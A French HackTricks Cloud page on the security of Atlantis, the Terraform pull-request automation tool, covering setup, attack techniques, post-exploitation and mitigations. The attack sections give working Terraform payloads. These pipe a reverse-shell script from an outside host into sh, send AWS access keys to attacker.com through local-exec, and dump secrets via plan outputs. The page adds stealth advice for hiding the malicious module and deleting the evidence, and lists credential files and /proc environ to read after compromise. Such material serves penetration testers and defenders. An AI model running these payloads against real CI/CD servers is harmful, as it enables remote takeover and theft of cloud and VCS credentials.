# S√©curit√© Atlantis

<details>

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Informations de base

Atlantis vous aide essentiellement √† ex√©cuter Terraform √† partir des demandes de tirage de votre serveur git.

![](<../.gitbook/assets/image (161).png>)

## Laboratoire local

1. Allez sur la page des **versions d'atlantis** √† [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) et **t√©l√©chargez** celle qui vous convient.
2. Cr√©ez un **jeton personnel** (avec acc√®s au d√©p√¥t) de votre utilisateur **github**
3. Ex√©cutez `./atlantis testdrive` et il cr√©era un **d√©p√¥t de d√©monstration** que vous pouvez utiliser pour **communiquer avec atlantis**
1. Vous pouvez acc√©der √† la page web √† 127.0.0.1:4141

## Acc√®s √† Atlantis

### Informations d'identification du serveur Git

**Atlantis** prend en charge plusieurs h√¥tes git tels que **Github**, **Gitlab**, **Bitbucket** et **Azure DevOps**.\
Cependant, pour acc√©der aux d√©p√¥ts sur ces plateformes et effectuer des actions, il doit disposer de certains **acc√®s privil√©gi√©s qui lui sont accord√©s** (au moins des autorisations d'√©criture).\
[**La documentation**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) encourage √† cr√©er un utilisateur sp√©cifiquement pour Atlantis sur ces plateformes, mais certaines personnes pourraient utiliser des comptes personnels.

{% hint style="warning" %}
Dans tous les cas, du point de vue d'un attaquant, le **compte Atlantis** va √™tre tr√®s **int√©ressant √† compromettre**.
{% endhint %}

### Webhooks

Atlantis utilise facultativement des [**secrets de webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) pour valider que les **webhooks** qu'il re√ßoit de votre h√¥te Git sont **l√©gitimes**.

Une fa√ßon de confirmer cela serait de **autoriser les requ√™tes √† venir uniquement des IPs** de votre h√¥te Git, mais une mani√®re plus simple est d'utiliser un Secret de Webhook.

Notez que sauf si vous utilisez un serveur github ou bitbucket priv√©, vous devrez exposer les points de terminaison de webhook √† Internet.

{% hint style="warning" %}
Atlantis va **exposer des webhooks** pour que le serveur git puisse lui envoyer des informations. Du point de vue d'un attaquant, il serait int√©ressant de savoir **si vous pouvez lui envoyer des messages**.
{% endhint %}

### Informations d'identification du fournisseur <a href="#provider-credentials" id="provider-credentials"></a>

[De la documentation :](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis ex√©cute Terraform en simplement **ex√©cutant les commandes `terraform plan` et `apply`** sur le serveur **sur lequel Atlantis est h√©berg√©**. Tout comme lorsque vous ex√©cutez Terraform localement, Atlantis a besoin des informations d'identification sp√©cifiques √† votre fournisseur.

C'est √† vous de d√©cider comment vous [fournissez les informations d'identification](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) pour votre fournisseur sp√©cifique √† Atlantis :

* Le Chart Helm d'Atlantis et le Module AWS Fargate ont leurs propres m√©canismes pour les informations d'identification du fournisseur. Consultez leur documentation.
* Si vous ex√©cutez Atlantis dans un cloud, de nombreux clouds ont des moyens de donner acc√®s √† l'API cloud aux applications qui y sont ex√©cut√©es, par exemple :
* [R√¥les EC2 AWS](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Recherchez "R√¥le EC2")
* [Comptes de service d'instance GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* De nombreux utilisateurs d√©finissent des variables d'environnement, par exemple `AWS_ACCESS_KEY`, l√† o√π Atlantis s'ex√©cute.
* D'autres cr√©ent les fichiers de configuration n√©cessaires, par exemple `~/.aws/credentials`, l√† o√π Atlantis s'ex√©cute.
* Utilisez le [Fournisseur HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) pour obtenir les informations d'identification du fournisseur.

{% hint style="warning" %}
Le **conteneur** o√π **Atlantis** est **ex√©cut√©** contiendra tr√®s probablement des informations d'identification privil√©gi√©es pour les fournisseurs (AWS, GCP, Github...) que Atlantis g√®re via Terraform.
{% endhint %}

### Page Web

Par d√©faut, Atlantis ex√©cutera une **page web sur le port 4141 en localhost**. Cette page vous permet simplement d'activer/d√©sactiver l'application d'atlantis et de v√©rifier l'√©tat du plan des d√©p√¥ts et de les d√©verrouiller (elle ne permet pas de modifier les choses, donc elle n'est pas tr√®s utile).

Vous ne la trouverez probablement pas expos√©e √† Internet, mais il semble qu'en **g√©n√©ral, aucune identification n'est n√©cessaire** pour y acc√©der (et si c'est le cas, `atlantis`:`atlantis` sont les **identifiants par d√©faut**).

## Configuration du serveur

La configuration du `serveur atlantis` peut √™tre sp√©cifi√©e via des indicateurs en ligne de commande, des variables d'environnement, un fichier de configuration ou une combinaison des trois.

* Vous pouvez trouver [**ici la liste des indicateurs**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) pris en charge par le serveur Atlantis
* Vous pouvez trouver [**ici comment transformer une option de configuration en une variable d'environnement**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Les valeurs sont **choisies dans cet ordre** :

1. Indicateurs
2. Variables d'environnement
3. Fichier de configuration

{% hint style="warning" %}
Notez que dans la configuration, vous pourriez trouver des valeurs int√©ressantes telles que des **jetons et des mots de passe**.
{% endhint %}

### Configuration des d√©p√¥ts

Certaines configurations affectent **la gestion des d√©p√¥ts**. Cependant, il est possible que **chaque d√©p√¥t n√©cessite des param√®tres diff√©rents**, il existe donc des moyens de sp√©cifier chaque d√©p√¥t. Voici l'ordre de priorit√© :

1. Fichier [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config). Ce fichier peut √™tre utilis√© pour sp√©cifier comment atlantis doit traiter le d√©p√¥t. Cependant, par d√©faut, certaines cl√©s ne peuvent pas √™tre sp√©cifi√©es ici sans certains indicateurs le permettant.
1. Probablement n√©cessaire d'√™tre autoris√© par des indicateurs comme `allowed_overrides` ou `allow_custom_workflows`
2. [**Configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) : Vous pouvez la passer avec l'indicateur `--repo-config` et c'est un yaml configurant de nouveaux param√®tres pour chaque d√©p√¥t (les regex sont pris en charge)
3. Valeurs **par d√©faut**
#### Protections des PR

Atlantis permet d'indiquer si vous souhaitez que la **PR** soit **`approuv√©e`** par quelqu'un d'autre (m√™me si cela n'est pas d√©fini dans la protection de la branche) et/ou soit **`fusionnable`** (protections de branche pass√©es) **avant d'ex√©cuter apply**. D'un point de vue s√©curit√©, il est recommand√© de d√©finir les deux options.

Dans le cas o√π `allowed_overrides` est True, ces param√®tres peuvent √™tre **remplac√©s sur chaque projet par le fichier `/atlantis.yml`**.

#### Scripts

La configuration du d√©p√¥t peut **sp√©cifier des scripts** √† ex√©cuter [**avant**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_hooks de pr√©-workflow_) et [**apr√®s**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_hooks de post-workflow_) l'ex√©cution d'un **workflow**.

Il n'y a pas d'option permettant de **sp√©cifier** ces scripts dans le fichier **`/atlantis.yml`** du d√©p√¥t.

#### Workflow

Dans la configuration du d√©p√¥t (configuration c√¥t√© serveur), vous pouvez [**sp√©cifier un nouveau workflow par d√©faut**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ou [**cr√©er de nouveaux workflows personnalis√©s**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Vous pouvez √©galement **sp√©cifier** quels **d√©p√¥ts** peuvent **acc√©der** aux **nouveaux** workflows g√©n√©r√©s.\
Ensuite, vous pouvez autoriser le fichier **atlantis.yaml** de chaque d√©p√¥t √† **sp√©cifier le workflow √† utiliser**.

{% hint style="danger" %}
Si le drapeau de configuration c√¥t√© serveur [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est d√©fini sur **True**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque d√©p√¥t. Il peut √©galement √™tre potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie √©galement **`workflow`** pour **remplacer le workflow** qui va √™tre utilis√©.\
Cela donnera essentiellement une **RCE dans le serveur Atlantis √† tout utilisateur pouvant acc√©der √† ce d√©p√¥t**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### V√©rification des politiques Conftest

Atlantis prend en charge l'ex√©cution des **politiques** [**conftest**](https://www.conftest.dev/) c√¥t√© **serveur** sur la sortie du plan. Les cas d'utilisation courants pour l'utilisation de cette √©tape incluent :

* Refuser l'utilisation d'une liste de modules
* Affirmer les attributs d'une ressource au moment de sa cr√©ation
* Attraper les suppressions de ressources involontaires
* Pr√©venir les risques de s√©curit√© (c'est-√†-dire exposer des ports s√©curis√©s au public)

Vous pouvez v√©rifier comment le configurer dans [**la documentation**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Commandes Atlantis

Dans [**la documentation**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis), vous pouvez trouver les options que vous pouvez utiliser pour ex√©cuter Atlantis :
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Attaques

{% hint style="warning" %}
Si lors de l'exploitation vous rencontrez cette **erreur** : `Error: Error acquiring the state lock`

Vous pouvez la corriger en ex√©cutant :
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Plan RCE d'Atlantis - Modification de la configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un d√©p√¥t, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis plan`** (ou peut-√™tre qu'il est ex√©cut√© automatiquement), **vous pourrez ex√©cuter du code √† distance (RCE) √† l'int√©rieur du serveur Atlantis**.

Vous pouvez le faire en faisant [**charger √† Atlantis une source de donn√©es externe**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Il suffit de mettre une charge utile comme celle-ci dans le fichier `main.tf` :
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Attaque plus discr√®te

Vous pouvez effectuer cette attaque de mani√®re encore plus discr√®te, en suivant ces suggestions :

* Au lieu d'ajouter directement le shell invers√© dans le fichier terraform, vous pouvez **charger une ressource externe** contenant le shell invers√© :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code de rev shell dans [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonction **ref** pour masquer le **code de rev shell terraform dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Au lieu de** cr√©er une **PR vers master** pour d√©clencher Atlantis, **cr√©ez 2 branches** (test1 et test2) et cr√©ez une **PR de l'une vers l'autre**. Lorsque vous avez termin√© l'attaque, **supprimez simplement la PR et les branches**.

### Atlantis plan Secrets Dump

Vous pouvez **extraire les secrets utilis√©s par terraform** en ex√©cutant `atlantis plan` (`terraform plan`) en ajoutant quelque chose comme ceci dans le fichier terraform :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis appliquer RCE - Modification de la configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un d√©p√¥t, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis apply`, vous pourrez ex√©cuter une RCE √† l'int√©rieur du serveur Atlantis**.

Cependant, vous devrez g√©n√©ralement contourner certaines protections :

- **Fusionnable** : Si cette protection est d√©finie dans Atlantis, vous ne pourrez ex√©cuter **`atlantis apply` que si la PR est fusionnable** (ce qui signifie que la protection de la branche doit √™tre contourn√©e).
- V√©rifiez les [**contournements de protections de branche potentiels**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **Approuv√©** : Si cette protection est d√©finie dans Atlantis, un **autre utilisateur doit approuver la PR** avant que vous puissiez ex√©cuter `atlantis apply`
- Par d√©faut, vous pouvez abuser du [**jeton Gitbot pour contourner cette protection**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Ex√©cuter **`terraform apply` sur un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Vous devez simplement vous assurer qu'une charge utile comme celles ci-dessous se termine dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re plus **discr√®te**.

### Injection de Param√®tres Terraform

Lors de l'ex√©cution de `atlantis plan` ou `atlantis apply`, terraform est ex√©cut√© en arri√®re-plan, vous pouvez transmettre des commandes √† terraform depuis atlantis en commentant quelque chose comme suit :
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
### Workflow Personnalis√©

L'ex√©cution de **commandes de construction personnalis√©es malveillantes** sp√©cifi√©es dans un fichier `atlantis.yaml`. Atlantis utilise le fichier `atlantis.yaml` de la branche de la demande de tirage, **pas** de `master`.\
Cette possibilit√© a √©t√© mentionn√©e dans une section pr√©c√©dente :

{% hint style="danger" %}
Si le drapeau de configuration c√¥t√© serveur [**server side config**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) est d√©fini sur **True**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque d√©p√¥t. Il est √©galement potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie √©galement **`workflow`** pour **remplacer le workflow** qui va √™tre utilis√©.

Cela donnera essentiellement une **RCE dans le serveur Atlantis √† tout utilisateur pouvant acc√©der √† ce d√©p√¥t**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Contourner les protections de planification/ex√©cution

Si le drapeau de configuration c√¥t√© serveur `allowed_overrides` a `apply_requirements` configur√©, il est possible pour un d√©p√¥t de **modifier les protections de planification/ex√©cution pour les contourner**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Piratage de PR

Si quelqu'un envoie des commentaires **`atlantis plan/apply` sur vos pull requests valides,** cela provoquera l'ex√©cution de terraform lorsque vous ne le souhaitez pas.

De plus, si vous n'avez pas configur√© dans la **protection de branche** pour demander de **r√©√©valuer** chaque PR lorsqu'un **nouveau commit est pouss√©** dessus, quelqu'un pourrait **√©crire des configurations malveillantes** (v√©rifiez les sc√©narios pr√©c√©dents) dans la configuration terraform, ex√©cuter `atlantis plan/apply` et obtenir une RCE.

Voici le **param√®tre** dans les protections de branche de Github:

![](<../.gitbook/assets/image (216).png>)

### Secret de Webhook

Si vous parvenez √† **voler le secret de webhook** utilis√© ou s'il n'y a **aucun secret de webhook** utilis√©, vous pourriez **appeler le webhook Atlantis** et **invoquer directement des commandes atlantis**.

### Bitbucket

Bitbucket Cloud ne prend pas en charge les secrets de webhook. Cela pourrait permettre aux attaquants de **usurper des requ√™tes de Bitbucket**. Assurez-vous de n'autoriser que les adresses IP de Bitbucket.

* Cela signifie qu'un **attaquant** pourrait envoyer des **fausses requ√™tes √† Atlantis** qui semblent provenir de Bitbucket.
* Si vous sp√©cifiez `--repo-allowlist`, alors ils pourraient uniquement envoyer de fausses requ√™tes concernant ces d√©p√¥ts, donc le plus de d√©g√¢ts qu'ils pourraient faire serait de planifier/appliquer sur vos propres d√©p√¥ts.
* Pour √©viter cela, autorisez la liste blanche des [adresses IP de Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (voir Adresses IPv4 sortantes).

## Post-Exploitation

Si vous parvenez √† acc√©der au serveur ou au moins si vous avez un LFI, voici quelques choses int√©ressantes que vous devriez essayer de lire:

* `/home/atlantis/.git-credentials` Contient les identifiants d'acc√®s au VCS
* `/atlantis-data/atlantis.db` Contient les identifiants d'acc√®s au VCS avec plus d'informations
* `/atlantis-data/repos/<nom_org>`_`/`_`<nom_du_repo>/<num_pr>/<espace_de_travail>/<chemin_vers_le_dossier>/.terraform/terraform.tfstate` Fichier d'√©tat Terraform
* Exemple : /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Variables d'environnement
* `/proc/[2-20]/cmdline` Ligne de commande de `atlantis server` (peut contenir des donn√©es sensibles)

## Att√©nuations

### Ne pas Utiliser Sur des D√©p√¥ts Publics <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Parce que n'importe qui peut commenter sur des pull requests publics, m√™me avec toutes les att√©nuations de s√©curit√© disponibles, il est toujours dangereux d'ex√©cuter Atlantis sur des d√©p√¥ts publics sans une configuration appropri√©e des param√®tres de s√©curit√©.

### Ne pas Utiliser `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si vous ex√©cutez sur un d√©p√¥t public (ce qui n'est pas recommand√©, voir ci-dessus), vous ne devriez pas d√©finir `--allow-fork-prs` (par d√©faut √† false) car n'importe qui peut ouvrir une pull request depuis leur fork vers votre d√©p√¥t.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis vous oblige √† sp√©cifier une liste blanche des d√©p√¥ts √† partir desquels il acceptera les webhooks via le drapeau `--repo-allowlist`. Par exemple :

* D√©p√¥ts sp√©cifiques : `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toute votre organisation : `--repo-allowlist=github.com/runatlantis/*`
* Chaque d√©p√¥t dans votre installation GitHub Enterprise : `--repo-allowlist=github.yourcompany.com/*`
* Tous les d√©p√¥ts : `--repo-allowlist=*`. Utile lorsque vous √™tes dans un r√©seau prot√©g√© mais dangereux sans d√©finir √©galement un secret de webhook.

Ce drapeau garantit que votre installation Atlantis n'est pas utilis√©e avec des d√©p√¥ts que vous ne contr√¥lez pas. Consultez `atlantis server --help` pour plus de d√©tails.

### Prot√©ger la Planification Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si les attaquants soumettent des pull requests avec du code Terraform malveillant dans votre mod√®le de menace, vous devez savoir que les approbations `terraform apply` ne suffisent pas. Il est possible d'ex√©cuter du code malveillant dans un `terraform plan` en utilisant la [source de donn√©es `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou en sp√©cifiant un fournisseur malveillant. Ce code pourrait ensuite exfiltrer vos identifiants.

Pour pr√©venir cela, vous pourriez :

1. Int√©grer les fournisseurs dans l'image Atlantis ou l'h√¥te et refuser la sortie en production.
2. Mettre en ≈ìuvre le protocole du registre des fournisseurs en interne et refuser la sortie publique, de cette mani√®re vous contr√¥lez qui a un acc√®s en √©criture au registre.
3. Modifier l'√©tape `plan` de votre [configuration de d√©p√¥t c√¥t√© serveur](https://www.runatlantis.io/docs/server-side-repo-config.html) pour valider contre l'utilisation de fournisseurs ou sources de donn√©es interdits ou des PR de utilisateurs non autoris√©s. Vous pourriez √©galement ajouter une validation suppl√©mentaire √† ce stade, par exemple exiger un "thumbs-up" sur la PR avant de permettre la poursuite du `plan`. Conftest pourrait √™tre utile ici.

### Secrets de Webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis doit √™tre ex√©cut√© avec des secrets de webhook d√©finis via les variables d'environnement `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. M√™me avec le drapeau `--repo-allowlist` d√©fini, sans secret de webhook, les attaquants pourraient envoyer des requ√™tes √† Atlantis en se faisant passer pour un d√©p√¥t qui est sur la liste blanche. Les secrets de webhook garantissent que les requ√™tes de webhook proviennent r√©ellement de votre fournisseur de VCS (GitHub ou GitLab).

Si vous utilisez Azure DevOps, au lieu de secrets de webhook, ajoutez un nom d'utilisateur et un mot de passe de base.

### Authentification de Base Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps prend en charge l'envoi d'un en-t√™te d'authentification de base dans tous les √©v√©nements de webhook. Cela n√©cessite d'utiliser une URL HTTPS pour l'emplacement de votre webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si vous utilisez des secrets de webhook mais que votre trafic est en HTTP, les secrets de webhook pourraient √™tre vol√©s. Activez SSL/HTTPS en utilisant les drapeaux `--ssl-cert-file` et `--ssl-key-file`.

### Activer l'Authentification sur le Serveur Web Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Il est fortement recommand√© d'activer l'authentification dans le service web. Activez BasicAuth en utilisant le `--web-basic-auth=true` et configurez un nom d'utilisateur et un mot de passe en utilisant les drapeaux `--web-username=yourUsername` et `--web-password=yourPassword`.

Vous pouvez √©galement passer ces informations en tant que variables d'environnement `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` et `ATLANTIS_WEB_PASSWORD=yourPassword`.

## R√©f√©rences

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez** üí¨ le [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
